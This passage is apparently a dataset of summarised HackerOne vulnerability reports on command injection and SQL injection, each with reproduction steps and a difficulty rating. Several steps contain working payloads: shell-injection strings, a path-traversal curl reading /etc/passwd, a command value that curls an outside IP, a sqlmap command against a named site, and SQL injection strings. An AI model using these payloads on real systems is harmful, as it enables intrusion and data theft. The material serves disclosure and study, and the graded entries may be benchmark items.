Steps to Reproduce:
1. Upload a specially crafted PostScript/EPS file renamed to .gif (e.g., rce.gif) as a profile image on Basecamp.com
2. The server processes the file using ImageMagick/GraphicsMagick, which invokes Ghostscript due to the '%!' header, exploiting CVE-2017-8291 to execute arbitrary commands
Exploitation Difficulty:
The vulnerability requires knowledge of multiple components (ImageMagick/Ghostscript interaction, file type confusion, and CVE-2017-8291) and involves a non-obvious interaction where a GIF file is processed as PostScript. However, the exploit is straightforward once these components are understood.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/378148: Vulnerability in project import leads to arbitrary command execution
================================================================================
Vulnerability Description:
A vulnerability in GitLab's project import functionality allows an attacker to bypass filename regex checks to create symbolic links in the upload directory. Combined with GitLab's behavior of not purging upload directories, this enables path traversal and arbitrary file upload, potentially leading to remote code execution as the GitLab system user.

Steps to Reproduce:
1. Create a specially crafted GitLab export tarball containing a symbolic link named '.\nevil' that bypasses the regex check in file_importer.rb
2. Import the tarball to create a project, then delete the project while the upload directory remains. Import another tarball with malicious files (e.g., authorized_keys) to the same project name, exploiting the symbolic link to overwrite system files
Exploitation Difficulty:
The attack involves multiple non-obvious components: bypassing a regex check with a carefully crafted filename, understanding GitLab's upload directory retention behavior, and chaining these with a second import to achieve file overwrite. The interaction between these components is subtle and requires precise timing/sequence.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/388936: [egg-scripts] Command injection
================================================================================
Vulnerability Description:
egg-script does not sanitize the --stderr command line argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection.

Steps to Reproduce:
1. Install egg: npm i egg --save
2. Install egg-scripts: sudo npm i egg-scripts -g --save
3. Run eggctl with malicious argument: eggctl start --daemon --stderr=/tmp/eggctl_stderr.log; touch /tmp/malicious
4. Check that the injected command was executed: ls /tmp/
5. Stop eggctl: eggctl stop
Exploitation Difficulty:
The vulnerability involves a straightforward command injection through unsanitized input passed to child_process.exec(). The attack does not require multiple components, complex state manipulation, or novel logic. It is a classic example of command injection with a clear path to exploitation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/389561: Command Injection Vulnerability in kill-port Package
================================================================================
Vulnerability Description:
The kill-port package (version 1.3.1) is vulnerable to command injection via the port parameter. An attacker can inject arbitrary OS commands by controlling the port value due to the use of exec in a third-party module.

Steps to Reproduce:
1. Install the kill-port package (version 1.3.1) in a Node.js environment.
2. Run the following code snippet that includes a malicious port value: `const kill = require('kill-port'); kill("23;`touch ./success.txt; 2222222222`");`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of command injection through user-controlled input. The attack does not require multiple components, complex state manipulation, or novel logic. It is a typical case of improper input sanitization leading to command execution.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/390631: [ascii-art] Command injection
================================================================================
Vulnerability Description:
ascii-art does not sanitize the target command line argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection.

Steps to Reproduce:
1. Install ascii-art: sudo npm install -g ascii-art (On a pristine Google Cloud instance, I also had to install pkg-config, libcairo2-dev, libjpeg-dev and libgif-dev, and then install ascii-art with unsafe-perm=true).
2. Run ascii-art with malicious argument: ascii-art preview 'doom"; touch /tmp/malicious; echo "'
Exploitation Difficulty:
The vulnerability involves a straightforward command injection through unsanitized input passed to child_process.exec(). The attack does not require multiple components, complex state manipulation, or novel logic. It is a classic example of command injection, which is a well-known vulnerability pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/390871: Command Injection Vulnerability in win-fork/win-spawn Packages
================================================================================
Vulnerability Description:
The win-spawn and win-fork packages on Windows execute commands in a way that allows command injection, similar to exec rather than spawn, enabling attackers to run arbitrary commands by injecting them into the command string.

Steps to Reproduce:
1. Override the OS type to simulate Windows environment: `require('os').type = function() {return "Windows_NT"};`
2. Call win-fork with a command that includes command injection: `spawn('dir C:// && date /T', [], {stdio: 'inherit'});`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic command injection in a well-known execution context (cmd.exe). The tester only needed to understand how the package processes commands on Windows and simulate the environment to observe the behavior.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/392311: Malware in `active-support` gem
================================================================================
Vulnerability Description:
The `active-support` gem is a malicious copy of the legitimate `activesupport` gem, which includes a compiled extension that resolves a base64-encoded domain, downloads a payload, and executes it on the victim's machine.

Steps to Reproduce:
1. Install the malicious `active-support` gem (with a hyphen) instead of the legitimate `activesupport` gem.
2. Run any Ruby code that requires the gem, triggering the embedded malicious code.
Exploitation Difficulty:
The vulnerability is straightforward to discover once the malicious gem is identified, as the malicious code is directly embedded in the gem's source. The attack does not involve complex interactions or states, and the logic is not novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/394294: [samsung-remote] Command injection
================================================================================
Vulnerability Description:
samsung-remote does not sanitize the IP address argument, and subsequently passes it to child_process.exec(), thus allowing arbitrary shell command injection. It is not unlikely that some systems using this package will pass a user-controlled IP address to the function, thus inadvertently allowing arbitrary code execution by the user.

Steps to Reproduce:
1. Install samsung-remote: npm install samsung-remote --save.
2. Create the following index.js file with the malicious IP address: '127.0.0.1; touch /tmp/malicious;'
3. Execute node index.js
4. Check that the injected command was executed: ls /tmp/
Exploitation Difficulty:
The vulnerability involves a straightforward command injection through unsanitized input passed to a shell command. The attack is simple and does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/405694: [apex-publish-static-files] Command Injection on connectString
================================================================================
Vulnerability Description:
The apex-publish-static-files npm module is vulnerable to command injection via the connectString parameter, which is passed unsanitized to execSync(), allowing arbitrary command execution.

Steps to Reproduce:
1. Install the vulnerable module: npm i apex-publish-static-files
2. Create an index.js file with malicious connectString payload and execute it: node index.js
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a direct command injection through a single unsanitized parameter in a simple code path. No complex interactions or state manipulations are required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/473888: RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) flaw in Rails 5.2 and later, stemming from the use of Marshal as the default serializer in ActiveSupport::MessageVerifier and ActiveSupport::MessageEncryptor. This allows for object injection attacks, particularly exploitable through ActiveStorage URLs even when ActiveStorage is not explicitly used in the application.

Steps to Reproduce:
1. Set up a Rails 5.2.2 environment with ActiveStorage configured
2. Generate a malicious payload using ActiveSupport::MessageVerifier with Marshal serializer to execute arbitrary code
3. Access the ActiveStorage disk service URL with the generated payload as the encoded_key parameter
4. Observe the execution of the arbitrary command (e.g., file creation in /tmp)
Exploitation Difficulty:
This vulnerability requires understanding multiple Rails components (MessageVerifier, MessageEncryptor, ActiveStorage) and their interactions, knowledge of Ruby's Marshal serialization dangers, and the ability to craft a specific object injection payload. However, the attack path is relatively straightforward once these components are understood, and similar Marshal-based vulnerabilities have been seen before in Ruby applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/587854: Local files could be overwritten in GitLab, leading to remote command execution
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to overwrite arbitrary files on the GitLab server by exploiting a feature that downloads a directory as a tar archive. By crafting a directory name that starts with double dashes, the attacker can inject command-line arguments into the git archive command, leading to file overwrites and potential remote code execution.

Steps to Reproduce:
1. Create a repository with a directory structure that starts with double dashes (e.g., '--output=/var/opt/gitlab/.ssh/authorized_keys/') and contains a file (e.g., 'id_ed25519.pub') with malicious content.
2. Use the GitLab feature to download the directory as a tar archive, which triggers the arbitrary file overwrite vulnerability.
Exploitation Difficulty:
The attack involves understanding the git archive command's behavior with malicious directory names and crafting a specific directory structure to exploit it. While the concept of argument injection is known, the specific interaction with GitLab's directory download feature is non-obvious and requires precise knowledge of the internal implementation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/653125: Git flag injection leading to file overwrite and potential remote code execution
================================================================================
Vulnerability Description:
The ref_name in the Commits API is not sanitized, allowing for a ref starting with -- to be provided causing git to interpret it as a flag instead of as a ref. This can lead to arbitrary file overwrite and truncation, potentially causing denial of service or privilege escalation by manipulating critical files like gitlab_shell_secret.

Steps to Reproduce:
1. Create a repo and add a file
2. Use the commit API and pass in a ref_name such as --output=/tmp/written: curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
3. Verify the file has been created: ls -asl /tmp/written
4. For privilege escalation, spam requests and wait for server restart to maintain file content
Exploitation Difficulty:
The vulnerability involves a straightforward injection of git flags through an unsanitized input parameter. While the impact can be severe, the discovery process is relatively simple as it only requires understanding how git interprets command-line flags and identifying an unsanitized input in the API.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/680480: Command Injection (via CVE-2019-11510 and CVE-2019-11539)
================================================================================
Vulnerability Description:
The vulnerability chain involves two CVEs in Pulse Secure SSL VPN: CVE-2019-11510 (pre-auth arbitrary file read) and CVE-2019-11539 (post-auth command injection). An attacker can first read sensitive files (including admin credentials) without authentication, then use those credentials to log in and execute commands on the device.

Steps to Reproduce:
1. Use curl to exploit CVE-2019-11510 and read sensitive files (e.g., /etc/passwd) from the Pulse Secure VPN device: `curl --path-as-is -s -k "https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"`
2. Extract admin credentials from the file `/data/runtime/mtmp/lmdb/dataa/data.mdb` (obtained via CVE-2019-11510) and log in as an administrator.
3. Exploit CVE-2019-11539 (post-auth command injection) to execute arbitrary commands on the device.
Exploitation Difficulty:
The attack involves multiple components (file read + credential extraction + command injection) and requires knowledge of both CVEs. However, the steps are well-documented in public exploits and Black Hat presentations, making the interaction between components more obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/688270: OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)
================================================================================
Vulnerability Description:
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution due to incomplete filtering in the getCleanCommand method, allowing an authenticated user with sufficient privileges to execute arbitrary OS commands.

Steps to Reproduce:
1. Navigate to 'Capabilities' in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo).
Exploitation Difficulty:
The vulnerability involves bypassing existing filters in a patched method, which requires understanding of the patch and how to circumvent it. However, the steps to exploit are straightforward once the bypass method is known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/858674: [wireguard-wrapper] Command Injection via insecure command concatenation
================================================================================
Vulnerability Description:
The wireguard-wrapper module is vulnerable to command injection via insecure command concatenation in the 'showconf' function. The 'device' parameter is passed directly into a shell command without proper sanitization, allowing arbitrary command execution.

Steps to Reproduce:
1. Install the wireguard-wrapper module: npm i --save wireguard-wrapper
2. Create a PoC JavaScript file (poc.js) with the following content: const { Wg } = require('wireguard-wrapper'); Wg.showconf('; touch HACKED').then(function(config){ console.log('wg0 configuration:', config); console.log('generated configuration file:', config.toString()); });
3. Execute the poc.js file: node poc.js
4. Verify that the HACKED file is created: ls
Exploitation Difficulty:
This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into a shell command. The attack does not require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/863544: [devcert] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a command injection issue in the devcert module where the `domain` parameter is used unsafely in a command executed via `child_process.execSync`. An attacker can inject arbitrary commands through the `domain` parameter, which are then executed on the victim's system.

Steps to Reproduce:
1. Create a directory for testing and install the devcert module: `mkdir poc && cd poc && npm i devcert`
2. Create a PoC JavaScript file (poc.js) with the following content: `const devcert = require('devcert'); async function poc() { let ssl = await devcert.certificateFor('\";touch HACKED;\"'); } poc()`
3. Execute the poc.js file: `node poc.js`
4. Verify the HACKED file is created: `ls`
Exploitation Difficulty:
The vulnerability involves a straightforward command injection where user input is directly concatenated into a command string without proper sanitization. The attack requires understanding the flow of the `domain` parameter through the code to the point of command execution, but does not involve complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/863944: [extra-ffmpeg] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a command injection issue in the extra-ffmpeg module, where user input is directly used in a command string without proper sanitization, allowing arbitrary command execution on the victim's PC.

Steps to Reproduce:
1. Install the extra-ffmpeg module: npm i extra-ffmpeg
2. Create a PoC JavaScript file (poc.js) with the following content: const ffmpeg = require('extra-ffmpeg'); ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);
3. Execute the poc.js file: node poc.js
4. Verify that the HACKED file is created: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting in Node.js modules. The attack requires minimal components and the interaction is obvious once the command injection vector is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/863956: [extra-asciinema] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a command injection issue in the extra-asciinema module where user input is directly used in a command executed via child_process.execSync without any sanitization, allowing arbitrary command execution.

Steps to Reproduce:
1. Install the extra-asciinema module: npm i extra-asciinema
2. Create a PoC file (poc.js) with the following content: const asciinema = require('extra-asciinema'); asciinema.uploadSync('; touch HACKED');
3. Execute the PoC file: node poc.js
4. Verify the creation of the HACKED file: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command construction with user input. The attack does not require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/864354: [diskstats] Command Injection via insecure command concatenation
================================================================================
Vulnerability Description:
The diskstats module is vulnerable to command injection via insecure command concatenation in the _fetchSpace and _fetchInodes functions. User-supplied input (path) is directly concatenated into a command executed by child_process.exec without proper sanitization, allowing arbitrary command execution.

Steps to Reproduce:
1. Install the diskstats module: npm i diskstats
2. Create a PoC JavaScript file (poc.js) with the following content: const diskstats = require('diskstats'); diskstats.check('; touch HACKED', (err, results) => {});
3. Execute the PoC file: node poc.js
4. Verify that the HACKED file was created: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it follows a common pattern of insecure command construction. The attack requires no complex interactions or state manipulation - just identifying the unsanitized user input being passed to exec(). This is a well-known vulnerability pattern in Node.js applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/864777: [vboxmanage.js] Command Injection via insecure command concatenation
================================================================================
Vulnerability Description:
The vulnerability is a command injection issue in the vboxmanage.js module, where user input (vmname) is used to build a command that is executed without proper sanitization. This allows an attacker to execute arbitrary commands on the victim's PC.

Steps to Reproduce:
1. Install vboxmanage.js module: npm i vboxmanage.js
2. Create a PoC JavaScript file (poc.js) with the following content: var VBox = require('vboxmanage.js'); VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
3. Execute the poc.js file: node poc.js
4. Verify the HACKED file is created: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation. The attack does not require multiple components or complex interactions, and the exploitation is direct once the vulnerable code path is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/865168: [xps] Command Injection via insecure command concatenation
================================================================================
Vulnerability Description:
The xps module is vulnerable to command injection due to insecure command concatenation in the kill function, which uses user-supplied input (pid) without proper sanitization. This allows an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. Create a directory for testing: mkdir poc && cd poc
2. Install the xps module: npm i xps
3. Create a PoC JavaScript file (poc.js) with the following content: const ps = require('xps'); ps.kill('`touch HACKED;`').fork();
4. Execute the PoC file: node poc.js
5. Verify the creation of the HACKED file: ls
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation in Node.js modules. The attack does not require multiple components or complex interactions; it simply exploits the lack of input sanitization in a single function call.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/871071: [gfc] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
No description available

Steps to Reproduce:
No steps available
Exploitation Difficulty:
None

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/881713: [last-commit-log] Command Injection
================================================================================
Vulnerability Description:
The vulnerability is a command injection in the 'last-commit-log' npm package, where the GIT_DIR environment variable is used unsafely in a git command execution. This allows an attacker to inject arbitrary commands that will be executed in the context of the application.

Steps to Reproduce:
1. Install the vulnerable package: npm i last-commit-log
2. Create a test file (test.js) with the provided code snippet
3. Set a malicious environment variable: export GIT_DIR=". ;touch xxx;"
4. Execute the test script: node test.js
Exploitation Difficulty:
The attack is straightforward, involving only the manipulation of an environment variable and understanding that it would be used unsafely in a command execution. There are no complex interactions or states to manipulate, and the vulnerability pattern (command injection via environment variables) is well-known in security contexts.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/925324: [systeminformation] Command Injection via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a command injection in the systeminformation package where an attacker can concatenate curl parameters to overwrite a JavaScript file of the package and then execute arbitrary OS commands. The issue arises from the use of child_process.exec() with insufficient input sanitization.

Steps to Reproduce:
1. Set up a Netcat server to serve a malicious JavaScript file on port 443.
2. Use the systeminformation package's inetChecksite function to overwrite the package's JavaScript file with the malicious one via a crafted URL.
3. Execute arbitrary OS commands by calling the overwritten function in the systeminformation package.
Exploitation Difficulty:
The attack involves multiple components including setting up a server, crafting a malicious URL, and understanding the package's internal file structure. However, the steps are straightforward once the initial setup is done, and the interaction between components is not particularly subtle.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/973386: [curling] Remote Code Execution
================================================================================
Vulnerability Description:
The curling module's regular expression does not properly validate input, allowing command injection via curl. This can be exploited to read or overwrite files on the system.

Steps to Reproduce:
1. Install the curling module: npm i curling
2. Create and run the following POC index.js:
const curling = require('curling');
curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
Exploitation Difficulty:
The vulnerability involves a straightforward bypass of input validation and exploitation of curl's capabilities. The attack does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------



SQL Injection Vulnerabilities (15 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1081145: SQL Injection through /include/findusers.php
================================================================================
Vulnerability Description:
The vulnerability is an SQL Injection in the /include/findusers.php script of ImpressCMS, where user input passed through the 'groups' POST parameter is not properly sanitized before being used in SQL queries. This allows attackers to execute arbitrary SQL commands and potentially access sensitive data from the database.

Steps to Reproduce:
1. Identify the vulnerable endpoint /include/findusers.php in ImpressCMS
2. Craft a malicious POST request with SQL injection payload in the 'groups' parameter to exploit the unsanitized input
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection through unsanitized input, which is a common and well-documented attack vector. The exploitation does not require complex application state manipulation or understanding of subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1663299: Ability to escape database transaction through SQL injection, leading to arbitrary code execution
================================================================================
Vulnerability Description:
The vulnerability allows escaping a database transaction via SQL injection in an EXPLAIN ANALYZE query feature, leading to arbitrary Ruby code execution through YAML deserialization in the paper_trail gem's reify method.

Steps to Reproduce:
1. Navigate to http://localhost:8080/support/sql_query_analyzer and input the malicious SQL query containing ROLLBACK and YAML payload.
2. Visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com to trigger the deserialization and execute arbitrary Ruby code.
Exploitation Difficulty:
This vulnerability involves multiple complex components: SQL injection to escape a transaction, crafting a YAML payload for Ruby deserialization, understanding the paper_trail gem's behavior, and triggering the deserialization through a specific application feature. The interaction between these components is non-obvious and requires deep understanding of both database transactions and Ruby object serialization.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/179920: WordPress DB Class, bad implementation of prepare method guides to sqli and information disclosure
================================================================================
Vulnerability Description:
The vulnerability involves two issues in the WordPress DB Class's `prepare` method: 1) it improperly handles arrays as the first argument, bypassing proper escaping, and 2) it incorrectly quotes `%s` placeholders, leading to SQL injection when user-controlled input is included in quoted queries. This affects plugins and themes using this method, such as bbPress and core WordPress functions like `delete_metadata`.

Steps to Reproduce:
1. Identify a WordPress plugin or theme that uses the `prepare` method in the WordPress DB Class, such as bbPress when anonymous posting is allowed.
2. Exploit the SQL injection vulnerability by submitting malicious input that includes user-controlled values in a query that uses `%s` in the `prepare` method, or by passing an array as the first argument to bypass proper escaping.
Exploitation Difficulty:
The vulnerability requires understanding the internal implementation of the `prepare` method and how it interacts with user-supplied input. The attacker must recognize the subtle differences in handling arrays versus strings and the implications of quoting `%s` placeholders. However, once these behaviors are known, exploitation is straightforward.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/273946: www.drivegrab.com SQL injection
================================================================================
Vulnerability Description:
The vulnerability is an SQL injection in the Formidable Pro WordPress plugin, where unauthenticated users can exploit the 'display-frm-data' shortcode's order parameter to inject malicious SQL queries. The injection occurs in the ORDER BY clause of an intermediate query, allowing data extraction through careful manipulation of query parameters and bypassing comma restrictions.

Steps to Reproduce:
1. Send a request to the AJAX endpoint with a basic form preview: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
2. Inject SQL via the 'display-frm-data' shortcode parameters: curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order="zzz"]YYY'
3. Use sqlmap with specialized parameters to bypass comma restrictions and extract data: ./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"' --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"
Exploitation Difficulty:
This vulnerability requires deep understanding of WordPress shortcodes, SQL injection techniques, and the plugin's specific handling of query parameters. The attacker must navigate multiple layers of parameter processing, develop custom SQL injection bypass techniques for comma restrictions, and use specialized tools like sqlmap with non-standard configurations to successfully exploit the flaw.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2882887: CVE-2024-53908: Django Potential SQL injection in `HasKey(lhs, rhs)` on Oracle
================================================================================
Vulnerability Description:
The vulnerability is a potential SQL injection in Django's `HasKey(lhs, rhs)` lookup when used on Oracle databases. Direct usage of this lookup with untrusted data as the `lhs` value can lead to SQL injection, allowing attackers to execute arbitrary SQL commands, potentially leading to unauthorized access, data manipulation, or information disclosure.

Steps to Reproduce:
1. Identify a Django application using the `HasKey(lhs, rhs)` lookup on an Oracle database.
2. Inject untrusted data into the `lhs` parameter of the `HasKey` lookup to execute arbitrary SQL commands.
Exploitation Difficulty:
The vulnerability requires specific knowledge of Django's ORM and the `HasKey` lookup, as well as understanding of Oracle database quirks. However, the attack vector is straightforward once these components are known, and the interaction between them is not overly complex or subtle.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/298176: SQL injection in MilestoneFinder order method
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the MilestoneFinder class of GitLab, specifically in the order method. The method directly uses user-supplied input in the 'order' parameter without proper sanitization, allowing an attacker to inject arbitrary SQL queries. This can be exploited to extract sensitive information from the database, including private access and shell tokens, potentially leading to privilege escalation and arbitrary code execution.

Steps to Reproduce:
1. Create a new group on a GitLab instance and create two milestones within it.
2. Send a crafted GET request to the group milestones endpoint with a malicious SQL injection payload in the 'order' parameter to extract sensitive data from the database.
Exploitation Difficulty:
The attack involves understanding the application's use of the MilestoneFinder class and how it processes the 'order' parameter. The attacker must craft a specific SQL injection payload that manipulates the query's ORDER BY clause to extract data through boolean-based blind SQL injection techniques. While the vulnerability itself is straightforward (unsanitized input in SQL query), crafting the correct payload requires knowledge of SQL injection techniques and the application's response behavior.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/311244: [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
================================================================================
Vulnerability Description:
SQL Injection vulnerability in query-mysql module due to lack of user input sanitization, allowing attackers to execute arbitrary SQL queries by manipulating input parameters.

Steps to Reproduce:
1. Install query-mysql module: npm install query-mysql
2. Run a malicious query by passing SQL injection payload in the id parameter: query.base.fetchById('users', 'noob\' or 1=1-- ', 'username', callback)
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it involves basic SQL injection techniques without requiring complex interactions or state manipulation. The attack vector is direct and well-documented in security contexts.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/374748: SQL injection in Serendipity (serendipity_fetchComments)
================================================================================
Vulnerability Description:
An authenticated administrator can exploit SQL injection in the Serendipity CMS by manipulating configuration fields that are used unsafely in SQL queries. This allows extraction of database records or file access on the server.

Steps to Reproduce:
1. Access the Serendipity admin panel as an authenticated administrator.
2. Alter either 'Entries to display on frontpage' or 'Entries to display in Feeds' by adding a non-numeric character.
3. Access the affected page (rss.php for Feeds, homepage for frontpage) to trigger the SQL injection.
Exploitation Difficulty:
The vulnerability involves understanding the configuration fields' impact on SQL queries and identifying unsanitized inputs in the serendipity_fetchComments function. The attack requires administrative access but follows a straightforward path once the vulnerable parameters are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/381758: sql injection on  /messagecenter/messagingcenter at https://www.███████/
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the search box of the messaging center. By injecting a single quote ('), the application returns a SQL syntax error, confirming the vulnerability. An attacker can exploit this to execute arbitrary SQL commands, potentially compromising the database integrity or exposing sensitive information.

Steps to Reproduce:
1. Navigate to https://www.████/messagecenter/messagingcenter
2. Enter a single quote (') in the search box and observe the SQL syntax error in the response
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires testing with a single quote (') in the search box, a common SQL injection test. The error message directly confirms the vulnerability, making it easy to identify without complex interactions or multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/397445: [express-cart] Customer and admin email enumeration through MongoDB injection
================================================================================
Vulnerability Description:
The vulnerability allows for email enumeration of customers and administrators due to lack of input sanitization in MongoDB queries. Attackers can use the $regex operator to perform blind injections and extract email addresses from the database.

Steps to Reproduce:
1. Identify the login endpoint for customers or administrators in express-cart
2. Send a crafted request with a MongoDB $regex operator in the email field to test for valid email addresses
Exploitation Difficulty:
The attack involves straightforward MongoDB injection using common operators like $regex. While it requires knowledge of MongoDB query syntax, the technique is well-documented and similar to SQL injection attacks, making it relatively easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/506644: [@azhou/basemodel] SQL injection
================================================================================
Vulnerability Description:
The @azhou/basemodel module is vulnerable to SQL injection due to direct concatenation of user-supplied input (table names, fields, and orderby clauses) into SQL queries without proper escaping. This allows attackers to manipulate queries to read unauthorized data or perform other SQL operations.

Steps to Reproduce:
1. Initialize the database and create a test table with sample data using @azhou/mysql-wrapper and @azhou/basemodel.
2. Execute model.getAll() with malicious input in the fields or orderby parameters to demonstrate SQL injection.
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it involves basic SQL injection techniques through direct input manipulation in commonly used CRUD operations. The attack does not require complex application state manipulation or understanding of subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/506654: [typeorm] SQL Injection
================================================================================
Vulnerability Description:
The vulnerability in TypeORM's `escapeQueryWithParameters` method in `MysqlDriver.ts` allows SQL injection when a function is passed as a parameter value. The method directly executes the function and uses its return value in the SQL query without proper escaping, enabling attackers to inject malicious SQL code.

Steps to Reproduce:
1. Initialize a new TypeORM project with MySQL database: `npx typeorm init --name Test --database mysql`
2. Modify the index.ts file to include a query with a function parameter that returns unescaped SQL: `console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => "-1 or firstName=0x54696d6265722033"}).getOne());`
Exploitation Difficulty:
The vulnerability requires understanding of TypeORM's query parameter handling and recognizing that function parameters bypass escaping. While the attack vector is straightforward once identified, discovering it requires knowledge of both TypeORM internals and SQL injection techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/507222: [untitled-model] sql injection
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the `untitled-model` npm package, which does not properly escape user inputs in its query generation functions. This allows an attacker to manipulate SQL queries by injecting malicious input, potentially leading to unauthorized data access or other database operations.

Steps to Reproduce:
1. Install the module using `yarn add untitled-model`
2. Set up a database with a `user` table and insert some test data
3. Run a proof-of-concept script that demonstrates SQL injection by manipulating the `id` parameter in the `filter` function
4. Observe the output showing that the SQL injection was successful, returning data for `id=2` when the query was designed to fetch `id=1`
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it involves a common SQL injection pattern without any need for complex interactions or state manipulations. The attack simply requires injecting SQL code through user-controlled input fields.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/508346: [increments] sql injection
================================================================================
Vulnerability Description:
The increments module is vulnerable to SQL injection in the vote function, allowing attackers to inject arbitrary SQL code to manipulate poll results, such as creating fake votes.

Steps to Reproduce:
1. Install the increments module: npm install increments
2. Run the proof-of-concept code to exploit the SQL injection vulnerability by injecting malicious SQL into the vote function
Exploitation Difficulty:
The vulnerability is straightforward to exploit once the SQL injection point is identified. It does not involve complex interactions or states, and the attack follows common SQL injection patterns.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/519631: SQL Injection in ████
================================================================================
Vulnerability Description:
There is an SQL injection vulnerability in ████████ in the /█████/recruiter/updapp.aspx page, exploitable through the app_id form parameter. An attacker could use this vulnerability to control the content in the database, exfiltrate information, and obtain remote code execution.

Steps to Reproduce:
1. Visit https://█████████/Gateway/sso.aspx and sign in.
2. With the Network tab of devtools open, visit https://██████/████/recruiter/updapp.aspx
3. Replay the GET request that returned the HTTP 500 error as a POST request with the body app_id='. This can be done by right clicking on the request, copying it as cURL, pasting the command in terminal, and appending -k -X POST --data "app_id='".
4. Notice in the response, there is an error: ORA-01756: quoted string not properly terminated.
